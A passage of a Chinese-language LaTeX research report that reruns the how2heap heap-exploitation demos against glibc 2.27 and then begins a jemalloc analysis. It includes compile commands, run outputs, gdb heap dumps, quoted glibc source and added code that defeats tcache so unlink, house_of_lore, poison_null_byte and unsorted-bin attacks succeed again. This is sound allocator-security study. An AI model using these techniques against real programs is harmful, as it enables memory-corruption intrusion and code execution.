$  how2heap git:(master) ✗ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 unsafe_unlink.c -o unsafe_unlink

$  how2heap git:(master) ✗ ldd unsafe_unlink 
    linux-vdso.so.1 =>  (0x00007fff301e7000)
    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007f9d47544000)
    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f9d478f9000)

$  how2heap git:(master) ✗ ./unsafe_unlink 
The global chunk0_ptr is at 0x601070, pointing to 0x1641260
The victim chunk we are going to corrupt is at 0x16412f0
Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: AAAAAAAA
\end{minted}

发现我们unsafe\_unlink攻击失效了。这是因为glibc-2.27添加了在unlink操作时候的检查,其中unlink操作的实现如下:
\begin{minted}[breaklines, frame=lines]{c}
#define unlink(AV, P, BK, FD) {                                                \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))       \
            malloc_printerr ("corrupted size vs. prev_size");                  \
    FD = P->fd;                                                                \
    BK = P->bk;                                                                \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr ("corrupted double-linked list");                        \
    else {                                                                     \
        FD->bk = BK;                                                           \
        BK->fd = FD;                                                           \
        if (!in_smallbin_range (chunksize_nomask (P))                          \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                 \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)             \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))             \
          malloc_printerr ("corrupted double-linked list (not small)");        \
            if (FD->fd_nextsize == NULL) {                                     \
                if (P->fd_nextsize == P)                                       \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
                else {                                                         \
                    FD->fd_nextsize = P->fd_nextsize;                          \
                    FD->bk_nextsize = P->bk_nextsize;                          \
                    P->fd_nextsize->bk_nextsize = FD;                          \
                    P->bk_nextsize->fd_nextsize = FD;                          \
                  }                                                            \
              } else {                                                         \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                  \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                  \
              }                                                                \
          }                                                                    \
      }                                                                        \
}
\end{minted}

glibc-2.26引入了tcache机制,这是一种线程缓存机制,每个线程默认情况下有 64 个大小递增的 bins,每个 bin 是一个单链表,默认最多包含 7 个 chunk。其中缓存的 chunk 是不会被合并的,所以在释放 chunk 1 的时候,\verb+chunk0_ptr+ 仍然指向正确的堆地址,而不是之前的 \verb+chunk0_ptr = P = P->fd+。
为了解决这个问题,一种可能的办法是给填充进特定大小的 chunk 把 bin 占满,就像下面这样:
\begin{minted}[breaklines, frame=lines]{c}
    int *a[10];
    int i;
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
\end{minted}

程序中添加如上代码,运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./unsafe_unlink
The global chunk0_ptr is at 0x601070, pointing to 0x6aa260
The victim chunk we are going to corrupt is at 0x6aa2f0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
\end{minted}
利用成功,那么如果我们绕过glibc-2.27中的tcache,即unsafe\_unlink的漏洞仍然存在。

\subsection{house\_of\_spirit}
编译、运行,得到如下结果:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_spirit.c -o house_of_spirit

$  how2heap-g227 ./house_of_spirit
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffda0ac1420
The second one: 0x7ffda0ac1440
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffda0ac1420.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffda0ac1420, which will be 0x7ffda0ac1430!
malloc(0x10): 0x7ffda0ac1430
\end{minted}

本攻击成功的原因是,我们已经控制了一个将被\verb+ free+的指针,且已经布置好了一个fastbin的\verb+ fake_chunk+的相关参数,接着在\verb+ free+操作时, 这个栈上的“堆块”即被投入 fastbin 中。
下一次\verb+ malloc+对应的大小时, 由于 fastbin 的机制为先进后出, 故上次\verb+ free+的栈上的“堆块”能够被优先返回给用户。

\subsection{house\_of\_lore}
编译,运行得到如下结果,发现攻击不能正常进行:
\begin{minted}[breaklines, frame=lines]{bash}
$  how2heap-g227 gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore
$  how2heap-g227 ./house_of_lore
Allocated the victim (small) chunk: 0x621260
stack_buffer_1: 0x7fff39008000
stack_buffer_2: 0x7fff39007fe0

Freeing the victim chunk 0x621260, it will be inserted in the unsorted bin
victim->fd: (nil)
victim->bk: 0x4141414141414141

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x621310
The victim chunk 0x621260 will be inserted in front of the SmallBin
victim->fd: (nil)
victim->bk: 0x4141414141414141

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x621260
The fd pointer of stack_buffer_2 has changed: 0x7fff39008000
\end{minted}

攻击失效了,我们来看一下是什么原因使攻击失效。下面的代码是glibc2.27中使用\verb+ tcache+对smallbins的处理方式。

\begin{minted}[breaklines, frame=lines]{c}
    size_t tc_idx = csize2tidx (nb);
    if (tcache && tc_idx < mp_.tcache_bins) {
            mchunkptr tc_victim;
            /* While bin not empty and tcache not full, copy chunks over.  */
            while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin) {
          if (tc_victim != 0) {
              bck = tc_victim->bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &main_arena)
            set_non_main_arena (tc_victim);
              bin->bk = bck;
              bck->fd = bin;
              tcache_put (tc_victim, tc_idx);
                }
        }
        }
\end{minted}

从程序的运行结果上来看,\verb+ victim->bk: 0x4141414141414141+的原因成为了我们\verb+ memset()+至内存的字符串,其中一大可能的原因是\verb+ tcache+,源代码的第39行执行完毕后,我们可以在gdb的调试中印证这一点:
\begin{minted}[breaklines, frame=lines]{bash}
gef> x/20gx victim-0x2
0x603250:   0x0000000000000000  0x0000000000000091 <--victim
0x603260:   0x0000000000000000  0x4141414141414141 -
...         0x4141414141414141  0x4141414141414141 | <-- 'A'*0x80
0x6032d0:   0x4141414141414141  0x4141414141414141 -

gef>  vmmap heap
Start              End                Offset             Perm  Path
0x0000000000603000 0x0000000000624000 0x0000000000000000 rw-   [heap]

gef> x/20gx 0x0000000000603000+0x10                <- heap base+0x10
0x603010:   0x0100000000000000  0x0000000000000000 <- tcache_01
0x603020:   0x0000000000000000  0x0000000000000000
0x603030:   0x0000000000000000  0x0000000000000000
0x603040:   0x0000000000000000  0x0000000000000000
0x603050:   0x0000000000000000  0x0000000000000000
0x603060:   0x0000000000000000  0x0000000000000000
0x603070:   0x0000000000000000  0x0000000000000000
0x603080:   0x0000000000000000  0x0000000000603260 <- victim
\end{minted}

在前面已经提到,\verb+ tcache+的作用是为了更快速的unlink,因此unlink下来的堆块首先将被放置在\verb+ tcache+中。因此,我们的处理方式和之前一样,只需要在\verb+ malloc(0x80)+之后添加填满tcache的代码:
\begin{minted}[breaklines, frame=lines]{c}
    // fill the tcache
    int *a[10];
    for (int i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
\end{minted}

并在再次\verb+ malloc(0x80)+之前清空掉\verb+ tcache+就可以了:
\begin{minted}[breaklines, frame=lines]{c}
    // empty the tcache
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }    
\end{minted}

接着编译后再运行,利用依然可以成功:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7m 53s 
$ gcc -g -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_lore.c -o house_of_lore_tcache_b

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_lore_tcache_b
Allocated the victim (small) chunk: 0x230d260
stack_buffer_1: 0x7ffeccacf810
stack_buffer_2: 0x7ffeccacf830

Freeing the victim chunk 0x230d260, it will be inserted in the unsorted bin
victim->fd: 0x7f5adfe2fca0
victim->bk: 0x7f5adfe2fca0

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x230d700
The victim chunk 0x230d260 will be inserted in front of the SmallBin
victim->fd: 0x7f5adfe2fd20
victim->bk: 0x7f5adfe2fd20

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7ffeccacf820
The fd pointer of stack_buffer_2 has changed: 0x7ffeccacf820

Nice jump d00d
\end{minted}

\subsection{house\_of\_einherjar}

编译后运行,\verb+ house_of_einherjar+完全不受影响:
\begin{minted}[breaklines, frame=lines]{shell}
$ ./house_of_einherjar 
We allocate 0x10 bytes for 'a': 0x16b9260

Our fake chunk at 0x7ffce41a2ae0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffce41a2ae0
bck: 0x7ffce41a2ae0
fwd_nextsize: 0x7ffce41a2ae0
bck_nextsize: 0x7ffce41a2ae0

We allocate 0xf8 bytes for 'b': 0x16b9280
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a 
so that it will consolidate with our fake chunk
Our fake prev_size will be 0x16b9270 - 0x7ffce41a2ae0 = 0xffff80031d516790

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80031d516790 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x16b9380
\end{minted}

\subsection{house\_of\_orange}

编译,运行,结果报错:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_orange.c -o house_of_orange      

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_orange   
house_of_orange: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed.
[1]    9705 abort      ./house_of_orange

\end{minted}

我们在报错信息中可以看到,是在malloc源代码中的第2401行看到:
\begin{minted}[breaklines, frame=lines]{c}
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
\end{minted}

我们在前面就已经提到过,house\_of\_orange是一种劫持\verb+ _IO_list_all+全局变量来伪造链表的利用技术,通过\verb+ _IO_flush_all_lockp()+函数触发。当glibc检测到内存错误的时候,会依次调用这样的函数路径:\verb+ malloc_printerr -> _libc_message -> abort -> _IO_flush_all_lockp+。
\begin{minted}[breaklines, frame=lines]{c}
// glibc-2.23 in libio/genops.c

int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖为伪造的链表
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   // 条件
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
        || (_IO_vtable_offset (fp) == 0
          && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
              > fp->_wide_data->_IO_write_base))
#endif
      )
      && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain;    // 指向我们指定的区域
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
\end{minted}

于是对\verb+ _IO_OVERFLOW(fp, EOF)+的调用会变成对\verb+ system('/bin/sh')+的调用。但是在glibc-2.24中\footnote{https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=commitdiff;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51}增加了对指针\verb+ vtable+的检查。
所有的\verb+ libio vtables+被放进了专用的只读的\verb+ __libc_IO_vtables+段,以使它们在内存中连续。在任何间接跳转之前,\verb+ vtable+指针将根据段边界进行检查,如果指针不在这个段,则调用函数\verb+ _IO_vtable_check()+做进一步的检查,并且在必要时终止进程:
\begin{minted}[breaklines, frame=lines]{c}
// glibc-2.24 in libio/libioP.h
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}

// glibc-2.24 in libio/vtables.c
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (_dl_open_hook != NULL
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
\end{minted}

\subsection{house\_of\_force}

编译,运行:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 10s 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_force.c -o house_of_force

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./house_of_force                                                                                                                                                 
We will overwrite a variable at 0x601080

Let's allocate the first chunk of 0x10 bytes: 0x1165260.
Real size of our allocated chunk is 0x18.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0x20d91
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x601080, and the top chunk is at 0x1165278, so accounting for the header size, we will malloc 0xffffffffff49bdf8 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x1165280
malloc(0x30) => 0x601080!

Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
old string: This is a string that we want to overwrite.
new string: YEAH!!!
\end{minted}

glibc-2.27不能防御house\_of\_force的利用。

\subsection{poison\_null\_byte}

编译,运行,不能攻击成功:
\begin{minted}[breaklines, frame=lines]{bash}
root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z took 7s 
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 poison_null_byte.c -o poison_null_byte

root in ~/how2heap-g227 at iZwz9eo57jnmoquu8r2fg0Z 
$ ./poison_null_byte         
We allocate 0x10 bytes for 'a': 0x1149260
'real' size of 'a': 0x18
b: 0x1149280
c: 0x1149390
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0x1149420
c.prev_size: 0
fake c.prev_size: 0x100

We malloc 'b2', our 'victim' chunk: 0x11494b0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0x1149500

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

我们在gdb中调试,在\verb+ free(b)+这条命令下断点,查看当前的堆分布:
\begin{minted}[breaklines, frame=lines]{bash}
gef> p b
$1 = (uint8_t *) 0x603280 ""

gef> vmmap heap
Start              End                Offset             Perm Path
0x0000000000603000 0x0000000000624000 0x0000000000000000 rw- [heap]

gef> x/30gx 0x0000000000603000+0x10                   <-- heap base
0x603010:   0x0000000000000000  0x0100000000000000    <-- tcache_1
0x603020:   0x0000000000000000  0x0000000000000000
...         ...                 ...
0x6030b0:   0x0000000000000000  0x0000000000000000
0x6030c0:   0x0000000000000000  0x0000000000603280    <-- address of b
\end{minted}

可以很明显的看到,glibc为了效率,没有将\verb+ free+后的b放置在\verb+  unsorted_bins+中。和之前的处理方式一样,我们只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了:
\begin{minted}[breaklines, frame=lines]{c}
    // deal with tcache, line 38
    int *k[10], i;
    for (i = 0; i < 7; i++) {
        k[i] = malloc(0x100);
    }
    for (i = 0; i < 7; i++) {
        free(k[i]);
    }
    free(b);
    
    // deal with tcache
    for (i = 0; i < 7; i++) {
        k[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(k[i]);
    }
    free(b1);
\end{minted}

增加了填满tcache的代码后,重新编译后运行:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./poison_null_byte_tcache
We allocate 0x10 bytes for 'a': 0x1104260
'real' size of 'a': 0x18
b: 0x1104280
c: 0x1104390
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0x1104280
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0x1104310
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0x1104280

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\end{minted}

利用成功。

\subsection{unsorted\_bin\_attack}

编译,运行得到结果:
\begin{minted}[breaklines, frame=lines]{bash}
$ ./unsorted_bin_attack    
The target we want to rewrite on stack: 0x7ffd6553aaa0 -> 0

Now, we allocate first small chunk on the heap at: 0x1093260
We free the first chunk now. Its bk pointer point to (nil)
We write it with the target address-0x10: 0x7ffd6553aa90

Let's malloc again to get the chunk we just free: 0x7ffd6553aaa0 -> (nil)
\end{minted}

利用没有成功,我们在gdb中打开,在\verb+ free(p)+后下断,并查看当前堆布局:
\begin{minted}[breaklines, frame=lines]{bash}
gef> p p
$1 = (unsigned long *) 0x602260

gef> vmmap heap
Start              End                Offset             Perm Path
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

gef> x/30gx 0x0000000000602000+0x10                  <-- heap base
0x602010:   0x0100000000000000  0x0000000000000000   <-- tcache_1
0x602020:   0x0000000000000000  0x0000000000000000
...         ...                 ...
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000602260   <-- address of p

\end{minted}

发现还是tcache的影响,我们和之前的操作一样,只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了。但是,与之前的不同的是,从\verb+ unsorted bins+中取出chunks的时候,会先放置在tcache bins中,然后再从 tcache bin 中取出。
那么问题就来了,在放进 tcache bin 的这个过程中,malloc 会以为我们的 target address 也是一个 chunk,然而这个 "chunk" 是过不了检查的,将抛出 "memory corruption" 的错误。如下方的处理逻辑:

\begin{minted}[brraklines, frame=lines]{c}
// in malloc.c, line 3788
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
    {
    bck = victim->bk;
    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize_nomask (victim)
	      > av->system_mem, 0))
    malloc_printerr ("malloc(): memory corruption");
\end{minted}

那么要想跳过放 chunk 的这个过程,就需要对应 tcache bin 的 counts 域不小于 tcache\_count(默认为7),但如果 counts 不为 0,说明 tcache bin 里是有 chunk 的,那么 malloc 的时候会直接从 tcache bin 里取出,于是就没有 unsorted bin 什么事了:

\begin{minted}[breaklines, frame=lines]{c}
if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
    && tcache
    && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
\end{minted}

这就造成了矛盾,所以我们需要找到一种既能从 unsorted bin 中取 chunk,又不会将 chunk 放进 tcache bin 的办法。这里用到的技术是,tcache poisoning\footnote{详见 http://tukan.farm/2017/07/08/tcache/}。
将 counts 修改成了 \verb+ 0xff+,于是在进行到下面这里时就会进入 else 分支,直接取出 chunk 并返回:

\begin{minted}[breaklines, frame=lines]{c}
// in malloc.c, line 2938
static void * tcache_get (size_t tc_idx) {
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  /* integer overflow: 0x00 - 1 = 0xff 
  make counts=0x00, then, it will be 0xff*/
  --(tcache->counts[tc_idx]);  
  return (void *) e;
}

// in malloc.c, line 3788
#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
\end{minted}

这里值得注意的是,\verb+ tcache_get()+函数内部不包含任何检查措施,也是我们利用成功的原因之一。

\subsection{unsorted\_bin\_into\_stack}

编译,运行,攻击没有成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./unsorted_bin_into_stack
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x164b260, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffd5f1d1600
malloc(0x100): 0x164b260

\end{minted}

攻击失败了,gdb调试可以看到:
\begin{minted}[breaklines, frame=lines]{bash}
gef> x/30gx 0x0000000000602000+0x10
0x602010:   0x0000000000000000  0x0100000000000000 <-- tcache_1
0x602020:   0x0000000000000000  0x0000000000000000
........:   ...                 ...
0x6020c0:   0x0000000000000000  0x0000000000602260 <-- address of victim

\end{minted}

可以很明显的看到,就像之前影响\verb+ free()+的一样,同样是tcache影响了,我们只需要在代码中将tcache占满即可:
\begin{minted}[breaklines, frame=lines]{c}
// deal with tcache
 int *k[10], i;
 for (i = 0; i < 7; i++) {
     k[i] = malloc(0x80);
 }
 for (i = 0; i < 7; i++) {
     free(k[i]);
 }
\end{minted}

添加后编译运行,攻击成功:

\begin{minted}[frame=lines, breaklines]{bash}
$ how2heap-227 ./unsorted_bin_into_stack
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0x1e53260, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffe370742b0
malloc(0x100): 0x7ffe370742b0

\end{minted}

\subsection{fastbin\_dup}

编译运行,依然可以利用成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./fastbin_dup            
Allocating 3 buffers.
1st malloc(9) 0x24c6260 points to AAAAAAAA
2nd malloc(9) 0x24c6280 points to BBBBBBBB
3rd malloc(9) 0x24c62a0 points to CCCCCCCC
Freeing the first one 0x24c6260.
Then freeing another one 0x24c6280.
Freeing the first one 0x24c6260 again.
Allocating 3 buffers.
4st malloc(9) 0x24c6260 points to DDDDDDDD the first time
5nd malloc(9) 0x24c6280 points to EEEEEEEE
6rd malloc(9) 0x24c6260 points to FFFFFFFF the second time

\end{minted}

\subsection{fastbin\_dup\_into\_stack}

编译运行,可以利用成功:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap-227 ./fastbin_dup_into_stack 
Allocating 3 buffers.
1st malloc(9) 0x7b4260 points to AAAAAAAA
2nd malloc(9) 0x7b4280 points to BBBBBBBB
3rd malloc(9) 0x7b42a0 points to CCCCCCCC
Freeing the first one 0x7b4260.
Then freeing another one 0x7b4280.
Freeing the first one 0x7b4260 again.
Allocating 4 buffers.
4nd malloc(9) 0x7b4260 points to 0x7ffd81252860
5nd malloc(9) 0x7b4280 points to EEEEEEEE
6rd malloc(9) 0x7b4260 points to FFFFFFFF
7th malloc(9) 0x7ffd81252850 points to GGGGGGGG

\end{minted}

\subsection{overlapping\_chunks}

攻击成功。

\subsection{overlapping\_chunks\_2}

攻击成功。
\newpage

% Section 4 jemalloc
\begin{center}
    \section{jemalloc 分析}
\end{center}

\setlength{\parindent}{2em}
此处分析的版本为jemalloc-5.0.1中的\verb+ malloc+实现。
为了方便调试,我们可以在编译\verb+ jemalloc+的时候保留调试符号信息:\verb+ --enable-debug+。
修改\verb+ Makefile+,使用jemalloc编译how2heap的二进制文件:
\begin{minted}[breaklines, frame=lines]{bash}
PROGRAMS = fastbin_dup fastbin_dup_into_stack fastbin_dup_consolidate unsafe_unlink house_of_spirit poison_null_byte malloc_playground first_fit house_of_lore overlapping_chunks overlapping_chunks_2 house_of_force unsorted_bin_attack house_of_einherjar house_of_orange
CFLAGS += -std=c99 -g
LDFLAGS += -L/usr/local/jemalloc/lib
LDLIBS += -ljemalloc
# Convenience to auto-call mcheck before the first malloc()
#CFLAGS += -lmcheck

all: $(PROGRAMS)
clean:
    rm -f $(PROGRAMS)
\end{minted}

\subsection{jemalloc简介}

现代CPU已大多数为多核CPU,多线程的应用程序也越来越广泛,内存的分配与回收也越来越成为制约程序性能的一大原因。因此为多核多线程的堆管理器jemalloc应运而生。

在过去,分配器使用\verb+ sbrk(2)+来获得内存,由于多种原因,其中包括竞争条件,碎片增加以及最大可用内存的人为限制,这是不理想的。 如果操作系统支持\verb+ sbrk(2)+,则该分配器按照该优先顺序同时使用\verb+ mmap(2)+和\verb+ sbrk(2)+; 否则仅使用\verb+ mmap(2)+。

这个堆分配器会使用多arena的方式来减少多核系统上多线程程序的锁竞争。除了多个arena之外,该分配器还支持线程特定的缓存,以便可以完全避免大多数分配请求的同步。 这样的缓存允许在正常情况下进行快速分配,但是它增加了内存的使用和分段,因为有限数量的对象可以在每个线程缓存中一直保存被分配的状态。

从jemalloc 5.0.0版本开始,不再使用"chunks"这个数据结构进行虚拟内存的管理,而是去使用一个新的,页面对齐的数据结构——extents。(于是之前几乎所有关于jemalooc的资料全部作废了,就是一夜回到解放前看源码)

在jemalloc的最新设计中,内存区域在概念上被划分为extents,extents始终与页面大小的倍数对齐,这种对齐可以让用户更快速的找到储存的元数据。用户的对象被分为大小两类,连续的小对象包含一个slab,也就是一个单一的extent,而大的对象则有自己的extents支持。

小的对象由slab分组管理,而每一个slab则维护一个bitmap追踪哪些区域正在被使用。不超过1 quantum一半的分配请求(8或16,依据架构而定)将四舍五入到最接近的2的幂,至少是\verb+ sizeof(double)+。

\subsection{unsafe\_unlink}

